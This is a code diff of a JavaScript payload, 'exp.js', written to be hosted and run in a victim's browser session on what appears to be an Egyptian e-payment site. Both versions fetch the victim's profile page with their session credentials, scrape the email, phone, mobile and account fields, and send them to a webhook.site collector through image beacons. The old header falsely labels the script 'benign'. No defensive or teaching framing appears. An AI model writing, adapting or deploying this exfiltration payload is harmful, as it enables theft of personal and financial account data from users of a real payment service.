@@ -1,40 +1,37 @@
-// exp.js — MINIMAL BENIGN script that fetches an absolute URL and logs/extracts email then beacons a small result
+// exp.js  — host this on https://yourhost/exp.js
 (function(){
-  var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
-  var COLLECTOR = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2";
+  // fetch profile page with victim credentials
 
-  try {
-    fetch(TARGET, { credentials: "include", redirect: "follow" })
-    .then(function(res){ 
-      // optional: send a tiny debug beacon with status
-      (new Image()).src = COLLECTOR + "?status=" + encodeURIComponent(res.status) + "&url=" + encodeURIComponent(res.url);
-      return res.text(); 
-    })
-    .then(function(html){
-      var data = {};
-      try {
-        html.replace(/<input[^>]*name=["']?([^"'\s>]+)["']?[^>]*value=["']?([^"']*)["']?/gi,
-          function(_, name, val){
-            data[name] = val;
-            return "";
-          });
-      } catch(e) { /* ignore */ }
+  fetch("/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0", { credentials: "include" })
+  .then(function(res){ return res.text(); })
+  .then(function(html){
+    // extract inputs like: <input ... name="email" ... value="...">
+    var data = {};
+    try {
+      html.replace(/<input[^>]*name=["']?([^"'\s>]+)["']?[^>]*value=["']?([^"']*)["']?/gi,
+        function(_, name, val){
+          data[name] = val;
+          return "";
+        });
+    } catch(e) { /* ignore */ }
 
-      var email = data.email || "";
-      var q = "email=" + encodeURIComponent(email);
-      for(var k in data){
-        if(k && (k==="email" || k==="phone" || k==="mobile" || k==="account")) {
-          q += "&" + encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
-        }
+    // pick fields to exfiltrate (example: email)
+    var email = data.email || "";
+
+    // prepare small payload (avoid super-long URLs)
+    var q = "email=" + encodeURIComponent(email);
+    for(var k in data){
+      // include up to a few fields
+      if(k && (k==="email" || k==="phone" || k==="mobile" || k==="account")) {
+        q += "&" + encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
       }
+    }
 
-      // small beacon with extracted fields (keeps payload short)
-      (new Image()).src = COLLECTOR + "?d=" + encodeURIComponent(q);
-    })
-    .catch(function(err){
-      (new Image()).src = COLLECTOR + "?err=" + encodeURIComponent(String(err));
-    });
-  } catch(e){
-    (new Image()).src = COLLECTOR + "?exc=" + encodeURIComponent(String(e));
-  }
+    // final beacon — use webhook.site or your collector
+    (new Image()).src = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2?d="+encodeURIComponent(q);
+  })
+  .catch(function(err){
+    // fallback: send small error beacon
+    (new Image()).src = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2?err="+encodeURIComponent(String(err));
+  });
 })();
